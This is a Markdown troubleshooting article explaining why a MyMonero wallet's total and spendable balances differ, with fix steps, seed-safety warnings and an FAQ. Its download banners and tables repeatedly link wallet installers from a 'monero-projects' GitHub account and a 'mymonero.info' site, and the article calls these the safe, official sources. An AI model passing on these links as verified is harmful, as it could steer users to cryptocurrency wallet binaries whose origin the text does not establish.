<p align="center"><img src="https://github.com/monero-projects/learn/raw/HEAD/assets/banner-article.png" alt="MyMonero article banner" width="100%"></p>

<h1 align="center">MyMonero Locked or Pending Balance</h1>
<p align="center">Understand why total funds and the amount available to send may differ.</p>

<p align="center">
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe"><img src="https://img.shields.io/badge/Download_for_Windows-00C6FF?style=for-the-badge&logo=windows&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for Windows"></a>
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg"><img src="https://img.shields.io/badge/Download_for_macOS-00C6FF?style=for-the-badge&logo=apple&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for macOS"></a>
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip"><img src="https://img.shields.io/badge/Download_for_Linux-00C6FF?style=for-the-badge&logo=linux&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for Linux"></a>
</p>

| Platform | File | Version |
|---|---|---|
| Windows | [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe) | v1.3.3 |
| macOS | [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg) | v1.3.3 |
| Linux | [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip) | v1.3.3 |

All versions and checksums are on the [MyMonero v1.3.3 release page](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3).

## Short answer
A wallet can show funds that are not yet spendable because an incoming transaction is pending or locked. Allow the wallet and network to update, and use the spendable amount rather than the total when planning a send.


Prefer reading on the web? The [MyMonero locked pending balance page](https://mymonero.info/mymonero-locked-pending-balance) on mymonero.info explains the same problem, the [MyMonero download page](https://mymonero.info/github/monero-projects) lists the safe sources, and [the MyMonero FAQ](https://mymonero.info/faq) covers the common questions.

## You'll see this if
- Your total balance is higher than the amount the wallet lets you send.
- A recent incoming transfer appears but cannot be spent yet.
- A withdrawal fails for insufficient available funds despite a visible balance.
- An exchange deposit is not yet credited or is still processing.

## Why it happens
A displayed total and a spendable balance answer different questions. Total funds can include value that has arrived but is not yet available for another transaction. Wallet scanning and network processing take time, and the wallet may show a status such as pending or locked. The amount available to send can also need to cover the transaction fee. These conditions do not automatically mean the wallet is broken or that funds have vanished.

Wallet synchronization matters too. If the app has not scanned current activity, its view can be stale. A restored wallet's restore height determines the block height from which it scans; earlier is safer when uncertain but slower. For scan issues, see [MyMonero transaction not showing](./mymonero-transaction-not-showing.md) and [MyMonero balance shows zero](./mymonero-balance-shows-zero.md).

The MyMonero desktop final release is v1.3.3, available for Windows (.exe), macOS (.dmg), and Linux (.zip) on the [GitHub release page](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3). The old app still opens wallets and sends XMR, but is no longer maintained and has no new features or security updates. MyMonero hosted servers and web wallet login stopped. You can continue using desktop or restore a seed in Cake Wallet, which runs on iOS, Android, macOS, and Linux; Windows desktop builds are paused at the time of writing. Review [MyMonero migration options](./mymonero-to-cake-wallet-migration.md).

---
## Fix
1. **Read the balance labels.** Identify the wallet's total, pending, locked, and spendable amounts if shown. Do not treat the largest displayed number as automatically available for a new transaction.
2. **Check recent incoming activity.** Open the transaction history and review the status of the expected incoming transfer. If it is not listed, confirm the receiving address with the sender and check [transaction not showing guidance](./mymonero-transaction-not-showing.md).
3. **Allow the wallet to update.** Keep the wallet open and allow its scan to catch up. If activity is stale, check MyMonero not syncing. Error 523 is general guidance that the server connection is unavailable; do not interpret it as a balance verdict.
4. **Do not repeatedly attempt a larger send.** A transaction requires funds that are spendable and room for the displayed fee. Wait for the pending funds to become available instead of retrying with the same total amount.
5. **Confirm the receiving address and amount before spending.** When spendable funds are available, review the destination address, amount, and fee carefully. Sending XMR to a wrong destination may not be reversible. For an exchange transfer, follow its current deposit directions; see withdraw XMR to an exchange.
6. **Check whether a restored wallet is scanning correctly.** If your history seems incomplete, verify that you restored the intended wallet and that the restore height is appropriate. Earlier height includes more history but takes longer. Read restore height explained.
7. **Keep recovery information private.** If you need to restore, use your seed only inside trusted wallet software. MyMonero seeds can have 13 words (MyMonero-specific, legacy) or 25 words (standard Monero). No legitimate helper needs the seed.
8. **Recheck after status changes.** Once the transaction is no longer pending or locked and the wallet is current, review the spendable amount again before sending.

> [!WARNING]
> Never share your seed or private keys to resolve a locked balance. Anyone asking for them is not needed for ordinary balance troubleshooting.

---
## If that did not work
If the pending status does not change, check whether the wallet has current scan information and whether the sender's service reports a completed transfer. For an exchange deposit, contact the exchange through its official account support channel if the wallet transaction is present but the account credit is not. Wallet status and exchange crediting are separate.

If the wallet shows zero or no activity after a restore, confirm the seed format, wallet identity, and restore height. A 13-word MyMonero-specific legacy seed and a 25-word standard Monero seed require compatible restore paths. See restore a MyMonero wallet. Do not share even part of the seed while asking for assistance.

The hosted MyMonero web wallet login is no longer available. Avoid replacement login pages that promise to clear a lock or unlock funds after you enter seed words. The desktop app is no longer maintained; official release details are at the MyMonero desktop project. Cake Wallet is the only alternative wallet named here. Evaluate its genuine restore process without exposing secrets.

## Prevention
- Distinguish total balance from spendable balance before planning a transfer.
- Allow recent funds and wallet scans to update before attempting to spend.
- Leave enough spendable value for the fee shown by the wallet.
- Verify deposit instructions and recipient details before sending.
- Keep your seed backed up privately and never enter it into a web support form.
- Record non-secret wallet notes, such as approximate activity and restore height, for future recovery.

## FAQ
<details><summary>Are locked funds lost?</summary>

A locked or pending label indicates funds are not currently available to spend, not by itself that they are lost. Check status and allow the wallet to update.

</details>

<details><summary>Can I spend the total balance?</summary>

Not necessarily. Only the spendable amount can be used, and a transaction also needs room for its fee.

</details>

<details><summary>Does a pending exchange deposit mean MyMonero is wrong?</summary>

No. The wallet's view and an exchange's crediting status are separate. Check both through their respective official interfaces.

</details>

<details><summary>Should I provide my seed to unlock funds?</summary>

Never. No legitimate helper needs your seed, and a request for it is a serious warning sign.

</details>

---

## Download MyMonero

- MyMonero download page: [mymonero.info download guide](https://mymonero.info/github/monero-projects)
- Windows: [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe)
- macOS: [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg)
- Linux: [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip)

Check each file against the checksums on the [MyMonero v1.3.3 release](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3) before you install it.

## Related articles

| Article | Topic |
|---|---|
| [MyMonero Spendable Balance Is Low](./mymonero-spendable-balance-low.md) | Find out why the amount available to send can be less than your total wallet balance. |
| [MyMonero Import Fee Explained](./mymonero-import-fee-explained.md) | What the historical wallet import fee meant, and how to approach a prompt today. |
| [Receive XMR With a MyMonero Address](./mymonero-receive-xmr-address.md) | Find and share a receiving address safely, and confirm the incoming transaction. |

[Back to all MyMonero guides](https://github.com/monero-projects/learn)
